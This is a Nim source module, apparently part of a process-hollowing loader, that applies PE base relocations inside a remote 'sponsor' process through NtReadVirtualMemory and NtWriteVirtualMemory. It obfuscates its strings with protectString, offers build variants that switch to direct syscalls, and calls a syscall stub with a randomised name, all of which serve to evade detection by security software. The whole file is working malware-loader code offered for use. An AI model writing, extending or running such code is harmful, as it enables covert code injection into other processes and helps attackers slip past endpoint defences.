import winim
import utils
import ptr_math
import nimprotect

type BASE_RELOCATION_ENTRY {.bycopy.} = object
    Offset* {.bitsize: 12.}: WORD
    Type* {.bitsize: 4.}: WORD

type BASE_RELOCATION_BLOCK {.bycopy.} = object
    PageAddress*: DWORD
    BlockSize*: DWORD

type PBASE_RELOCATION_ENTRY = ptr BASE_RELOCATION_ENTRY
type PBASE_RELOCATION_BLOCK = ptr BASE_RELOCATION_BLOCK

proc NtReadVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToRead: SIZE_T, NumberOfBytesReaded: PSIZE_T): NTSTATUS {.stdcall, dynlib: protectString("ntdll"), importc.}

when defined(hollow1) or defined(hollow4):
    proc NtWriteVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall, dynlib: protectString("ntdll"), importc.}
when defined(hollow2) or defined(hollow5):
    include syscalls2
when defined(hollow3) or defined(hollow6):
    include syscalls3

proc applyRelocations*(peBytesPtr: ptr byte, newImageBaseAddress: LPVOID, sponsorProcessHandle: HANDLE): bool =
    var peImageDosHeader = cast[ptr IMAGE_DOS_HEADER](peBytesPtr)
    var peImageNtHeaders = cast[ptr IMAGE_NT_HEADERS]((cast[ptr BYTE](peBytesPtr) + peImageDosHeader.e_lfanew))
    var peImageSectionsHeader = cast[ptr IMAGE_SECTION_HEADER](cast[size_t](peImageNtHeaders) + sizeof(IMAGE_NT_HEADERS))
    var peImageImageBase = cast[LPVOID](peImageNtHeaders.OptionalHeader.ImageBase)
    var dwDelta = cast[DWORD](cast[int](newImageBaseAddress) - cast[int](peImageImageBase)) 
    if dwDelta == 0:
        return true
    for i in countUp(0, cast[int](peImageNtHeaders.FileHeader.NumberOfSections) - 1):
        if toString(peImageSectionsHeader[i].Name) == protectString(".reloc"):
            var dwRelocAddr = peImageSectionsHeader[i].PointerToRawData
            var dwOffset: DWORD = 0
            var relocData = cast[IMAGE_DATA_DIRECTORY](peImageNtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC])
            while(dwOffset < relocData.Size):
                var pBlockheader = cast[PBASE_RELOCATION_BLOCK](peBytesPtr[dwRelocAddr + dwOffset])
                dwOffset += cast[DWORD](sizeof(BASE_RELOCATION_BLOCK))
                var dwEntryCount = cast[DWORD]((pBlockheader.BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY))
                var pBlocks = cast[PBASE_RELOCATION_ENTRY](peBytesPtr[dwRelocAddr + dwOffset])
                for j in countUp(0, dwEntryCount):
                    dwOffset += cast[DWORD](sizeof(BASE_RELOCATION_ENTRY))
                    if (pBlocks[j].Type == 0):
                        continue
                    var dwFieldAddress = pBlockheader.PageAddress + cast[DWORD](pBlocks[j].Offset)
                    var dwBuffer: DWORD = 0
                    if NtReadVirtualMemory(
                        sponsorProcessHandle, 
                        cast[PVOID](cast[DWORD](newImageBaseAddress) + dwFieldAddress), 
                        addr dwBuffer,
                        cast[SIZE_T](sizeof(DWORD)),
                        NULL
                    ) != TRUE:
                        return false
                    dwBuffer += dwDelta
                    when defined(hollow1) or defined(hollow4):
                        if NtWriteVirtualMemory(
                            sponsorProcessHandle,
                            cast[PVOID](cast[DWORD](newImageBaseAddress) + dwFieldAddress),
                            addr dwBuffer,
                            cast[SIZE_T](sizeof(DWORD)),
                            NULL
                        ) != TRUE:
                            return false
                    when defined(hollow2) or defined(hollow3) or defined(hollow5) or defined(hollow6):
                        if nVcnEsSyWXtfrjav(
                            sponsorProcessHandle,
                            cast[PVOID](cast[DWORD](newImageBaseAddress) + dwFieldAddress),
                            addr dwBuffer,
                            cast[SIZE_T](sizeof(DWORD)),
                            NULL
                        ) != TRUE:
                            return false
    return true